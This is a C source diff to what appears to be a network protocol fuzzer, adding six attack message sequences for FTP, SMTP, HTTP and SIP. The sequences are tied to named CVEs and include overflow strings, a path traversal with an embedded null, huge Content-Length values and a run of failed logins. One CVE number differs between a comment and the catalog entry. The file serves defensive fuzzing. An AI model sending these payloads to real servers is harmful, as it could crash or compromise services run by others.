@@ -787,6 +787,99 @@ static const attack_msg_step_t pat_deep_http_lifecycle[] = {
   {"GET /databases/1/items HTTP/1.1\r\nHost: localhost\r\n\r\n", NULL, NULL, 0, 1},
 };
 
+
+/* ══════════════════════════════════════════════════════════════════
+ * 2026-09-07: 6 new deep-state patterns targeting known CVE classes
+ * that the existing catalog does not reach.
+ * ══════════════════════════════════════════════════════════════════ */
+
+/* FTP: MLSD after login — targets pure-ftpd CVE-2024-48208 (domlsd OOB
+ * read when MLSD receives a long "-..." option sequence). */
+static const attack_msg_step_t pat_deep_ftp_mlsd[] = {
+  {"USER ubuntu\r\n", NULL, NULL, 0, 1},
+  {"PASS ubuntu\r\n", NULL, NULL, 0, 1},
+  {"TYPE I\r\n", NULL, NULL, 0, 1},
+  {"EPSV\r\n", NULL, NULL, 0, 1},
+  {"MLSD -AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA-AAAA\r\n", NULL, NULL, 0, 1},
+  {"MLST /\r\n", NULL, NULL, 0, 1},
+  {"QUIT\r\n", NULL, NULL, 0, 1},
+};
+
+/* FTP: rename lifecycle — targets proftpd CVE-2023-51713 (OOB read in
+ * make_ftp_cmd when processing quoted/backslash arguments to RNTO). */
+static const attack_msg_step_t pat_deep_ftp_rename[] = {
+  {"USER ubuntu\r\n", NULL, NULL, 0, 1},
+  {"PASS ubuntu\r\n", NULL, NULL, 0, 1},
+  {"MKD /tmp/loopfuzz_rename\r\n", NULL, NULL, 0, 1},
+  {"RNFR /tmp/loopfuzz_rename\r\n", NULL, NULL, 0, 1},
+  {"RNTO /tmp/loopfuzz_renamed\r\n", NULL, NULL, 0, 1},
+  {"RNFR /tmp/loopfuzz_renamed\r\n", NULL, NULL, 0, 1},
+  {"RNTO \\SYST\r\n", NULL, NULL, 0, 1},
+  {"RNFR \"../..\"\r\n", NULL, NULL, 0, 1},
+  {"RNTO \"../.." "\\x00" "\"\r\n", NULL, NULL, 0, 1},
+  {"DELE /tmp/loopfuzz_renamed\r\n", NULL, NULL, 0, 1},
+  {"QUIT\r\n", NULL, NULL, 0, 1},
+};
+
+/* SMTP: BDAT chunked transfer — targets exim CVE-2017-16943 (UAF in BDAT
+ * handling) and CVE-2023-42115 (base64 OOB write in AUTH path). */
+static const attack_msg_step_t pat_deep_smtp_bdat[] = {
+  {"EHLO localhost\r\n", NULL, NULL, 0, 1},
+  {"AUTH LOGIN\r\n", NULL, NULL, 0, 1},
+  {"dXNlcnVuYnVudHU=\r\n", NULL, NULL, 0, 1},
+  {"dWJ1bnR1\r\n", NULL, NULL, 0, 1},
+  {"MAIL FROM:<ubuntu@ubuntu>\r\n", NULL, NULL, 0, 1},
+  {"RCPT TO:<ubuntu@ubuntu>\r\n", NULL, NULL, 0, 1},
+  {"BDAT 1 LAST\r\n", NULL, NULL, 0, 1},
+  {"X", NULL, NULL, 0, 1},
+  {"BDAT 0\r\n", NULL, NULL, 0, 1},
+  {"MAIL FROM:<test@example.com>\r\n", NULL, NULL, 0, 1},
+  {"RCPT TO:<test@example.com>\r\n", NULL, NULL, 0, 1},
+  {"BDAT 100\r\n", NULL, NULL, 0, 1},
+  {"QUIT\r\n", NULL, NULL, 0, 1},
+};
+
+/* HTTP/DAAP: library rescan trigger + deep search — targets the
+ * forked-daapd listener UAF we found (scan/update traffic vs teardown
+ * ordering). CVE-2025-44560 is NOT triggerable on mirror 27.2, so the
+ * nested expression here is stress input, not a CVE claim. */
+static const attack_msg_step_t pat_deep_http_rescan[] = {
+  {"GET /api/config HTTP/1.1\r\nHost: localhost\r\n\r\n", NULL, NULL, 0, 1},
+  {"PUT /api/update HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n", NULL, NULL, 0, 1},
+  {"GET /api/search?type=track&expression=time_add" "(", NULL, NULL, 0, 1},
+  {"(", NULL, NULL, 0, 200},
+  {") HTTP/1.1\r\nHost: localhost\r\n\r\n", NULL, NULL, 0, 1},
+  {"GET /api/queue HTTP/1.1\r\nHost: localhost\r\n\r\n", NULL, NULL, 0, 1},
+  {"PUT /api/update HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n", NULL, NULL, 0, 1},
+  {"GET /api/library HTTP/1.1\r\nHost: localhost\r\n\r\n", NULL, NULL, 0, 1},
+};
+
+/* SIP: Content-Length overflow — targets kamailio CVE-2026-39863 (core
+ * tcp_read_headers integer overflow with huge Content-Length). */
+static const attack_msg_step_t pat_deep_sip_clen[] = {
+  {"REGISTER sip:33@127.0.0.1:5060 SIP/2.0\r\nVia: SIP/2.0/TCP 127.0.0.1:5061;branch=z9hG4bK-d1\r\nFrom: <sip:33@127.0.0.1>;tag=d1\r\nTo: <sip:33@127.0.0.1>\r\nCall-ID: deep-clen@127.0.0.1\r\nCSeq: 1 REGISTER\r\nContent-Length: ", NULL, NULL, 0, 1},
+  {"9", NULL, NULL, 0, 20},
+  {"\r\n\r\n", NULL, NULL, 0, 1},
+  {"REGISTER sip:33@127.0.0.1:5060 SIP/2.0\r\nVia: SIP/2.0/TCP 127.0.0.1:5061;branch=z9hG4bK-d2\r\nFrom: <sip:33@127.0.0.1>;tag=d2\r\nTo: <sip:33@127.0.0.1>\r\nCall-ID: deep-clen2@127.0.0.1\r\nCSeq: 2 REGISTER\r\nContent-Length: 2147483647\r\n\r\n", NULL, NULL, 0, 1},
+  {"INVITE sip:34@127.0.0.1:5060 SIP/2.0\r\nVia: SIP/2.0/TCP 127.0.0.1:5061;branch=z9hG4bK-d3\r\nFrom: <sip:33@127.0.0.1>;tag=d3\r\nTo: <sip:34@127.0.0.1>\r\nCall-ID: deep-clen3@127.0.0.1\r\nCSeq: 3 INVITE\r\nContent-Length: 99999999999999\r\n\r\n", NULL, NULL, 0, 1},
+};
+
+/* FTP: auth brute-force — targets FTP "Excessive failed authentication"
+ * oracle rule which had no seed coverage. */
+static const attack_msg_step_t pat_deep_ftp_authfail[] = {
+  {"USER wronguser\r\n", NULL, NULL, 0, 1},
+  {"PASS wrongpass\r\n", NULL, NULL, 0, 1},
+  {"USER wronguser\r\n", NULL, NULL, 0, 1},
+  {"PASS wrongpass\r\n", NULL, NULL, 0, 1},
+  {"USER wronguser\r\n", NULL, NULL, 0, 1},
+  {"PASS wrongpass\r\n", NULL, NULL, 0, 1},
+  {"USER wronguser\r\n", NULL, NULL, 0, 1},
+  {"PASS wrongpass\r\n", NULL, NULL, 0, 1},
+  {"USER wronguser\r\n", NULL, NULL, 0, 1},
+  {"PASS wrongpass\r\n", NULL, NULL, 0, 1},
+  {"QUIT\r\n", NULL, NULL, 0, 1},
+};
+
 static const attack_pattern_t deep_patterns[] = {
   { "deep_rtsp_toggle", "RTSP", "deep-state/pause-play-toggle",
     pat_deep_rtsp_toggle, ATTACK_ARRAY_CNT(pat_deep_rtsp_toggle), 1 },
@@ -804,6 +897,19 @@ static const attack_pattern_t deep_patterns[] = {
     pat_deep_sip_reinvite, ATTACK_ARRAY_CNT(pat_deep_sip_reinvite), 1 },
   { "deep_http_lifecycle", "HTTP", "deep-state/resource-lifecycle",
     pat_deep_http_lifecycle, ATTACK_ARRAY_CNT(pat_deep_http_lifecycle), 1 },
+  /* 2026-09-07: 6 new patterns targeting known CVE classes */
+  { "deep_ftp_mlsd", "FTP", "CVE-2024-48268/pure-ftpd-domlsd",
+    pat_deep_ftp_mlsd, ATTACK_ARRAY_CNT(pat_deep_ftp_mlsd), 1 },
+  { "deep_ftp_rename", "FTP", "CVE-2023-51713/proftpd-rnto-oob",
+    pat_deep_ftp_rename, ATTACK_ARRAY_CNT(pat_deep_ftp_rename), 1 },
+  { "deep_smtp_bdat", "SMTP", "CVE-2017-16943/exim-bdat-uaf",
+    pat_deep_smtp_bdat, ATTACK_ARRAY_CNT(pat_deep_smtp_bdat), 1 },
+  { "deep_http_rescan", "HTTP", "owntone-teardown-uaf-stress",
+    pat_deep_http_rescan, ATTACK_ARRAY_CNT(pat_deep_http_rescan), 1 },
+  { "deep_sip_clen", "SIP", "CVE-2026-39863/kamailio-clen-ovf",
+    pat_deep_sip_clen, ATTACK_ARRAY_CNT(pat_deep_sip_clen), 1 },
+  { "deep_ftp_authfail", "FTP", "ftp-auth-brute",
+    pat_deep_ftp_authfail, ATTACK_ARRAY_CNT(pat_deep_ftp_authfail), 1 },
 };
 
 unsigned int deep_state_enrich_seeds(const char *seed_dir, const char *protocol) {
